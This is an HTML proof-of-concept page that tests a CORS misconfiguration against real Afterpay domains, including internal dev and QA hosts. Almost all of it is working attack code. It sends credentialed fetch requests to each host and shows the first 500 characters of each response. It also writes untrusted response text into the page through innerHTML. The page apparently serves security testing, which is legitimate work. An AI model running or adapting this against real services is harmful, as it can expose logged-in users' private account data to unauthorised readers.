<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>CORS Misconfiguration Proof of Concept</title>
<style>
  body { font-family: Arial, sans-serif; padding: 20px; background: #fafafa; }
  h1 { color: #333; }
  h2 { margin-top: 30px; color: #555; }
  pre { background: #eee; padding: 10px; border-radius: 5px; max-height: 200px; overflow-y: auto; white-space: pre-wrap; word-break: break-word; }
  .success { color: green; }
  .fail { color: red; }
</style>
</head>
<body>
  <h1>CORS Misconfiguration Proof of Concept</h1>
  <p>This page fetches multiple Afterpay URLs with credentials included to test CORS policy.</p>
  <div id="results"></div>

  <script>
    const urls = [
      "https://dq-testing-dev.corp.afterpay.com",
      "https://connect.afterpay.com",
      "https://iq.afterpay.com",
      "https://developers.afterpay.com",
      "https://dq-testing-qa.corp.afterpay.com",
      "https://dq-testing.corp.afterpay.com"
    ];

    const resultsDiv = document.getElementById('results');

    async function testUrl(url) {
      try {
        const response = await fetch(url, { method: 'GET', credentials: 'include' });
        const text = await response.text();

        resultsDiv.innerHTML += `
          <h2>${url}</h2>
          <p class="success">Request succeeded with status: ${response.status}</p>
          <pre>${text.substring(0, 500)}</pre>
        `;
      } catch (error) {
        resultsDiv.innerHTML += `
          <h2>${url}</h2>
          <p class="fail">Request failed: ${error.message}</p>
        `;
      }
    }

    urls.forEach(url => testUrl(url));
  </script>
</body>
</html>
